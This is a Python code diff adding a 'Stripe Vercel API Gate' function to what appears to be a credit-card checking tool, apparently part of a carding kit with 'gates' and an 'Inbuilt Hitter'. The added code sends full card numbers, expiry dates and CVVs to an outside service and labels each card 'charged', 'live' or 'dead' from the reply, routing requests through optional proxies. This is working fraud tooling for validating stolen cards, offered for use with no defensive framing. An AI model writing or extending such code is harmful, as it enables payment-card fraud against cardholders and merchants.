@@ -771,6 +771,35 @@ async def check_stripe_inbuilt(card: str, month: str, year: str, cvv: str, pk: s
     except Exception as e:
         return {"status": "error", "response": str(e), "gate": "Inbuilt Hitter"}
 
+async def check_stripe_vercel(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
+    """Stripe Vercel API Gate (Single Check Only)"""
+    url = f"https://st-charge-1.vercel.app/check?gateway=St_Charge_1$&key=AloneOp&cc={card}|{month}|{year}|{cvv}"
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, proxy=proxy, timeout=60) as resp:
+                try:
+                    res_json = await resp.json()
+                except:
+                    text = await resp.text()
+                    return {"status": "error", "response": text[:100], "gate": "Stripe Single"}
+                
+                status = res_json.get("Status", "").lower() # Note: API returns Capitalized keys 'Status', 'Response'
+                response = res_json.get("Response", "")
+                
+                if "charged" in status or "success" in status or "approved" in status:
+                     return {"status": "charged", "amount": "$1.00", "response": "Charged/Auth Success 🔥", "gate": "Stripe Single"}
+                
+                if "insufficient" in response.lower() or "insufficient" in status:
+                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Stripe Single"}
+                
+                if "security code" in response.lower() or "cvv" in response.lower():
+                     return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "Stripe Single"}
+
+                return {"status": "dead", "response": response or "Declined", "gate": "Stripe Single"}
+    except Exception as e:
+        return {"status": "error", "response": str(e), "gate": "Stripe Single"}
+
 
 async def check_stripe_wc(c, m, y, cv, p=None): 
     return {"status": "declined", "response": "Fallback", "gate": "WC"}
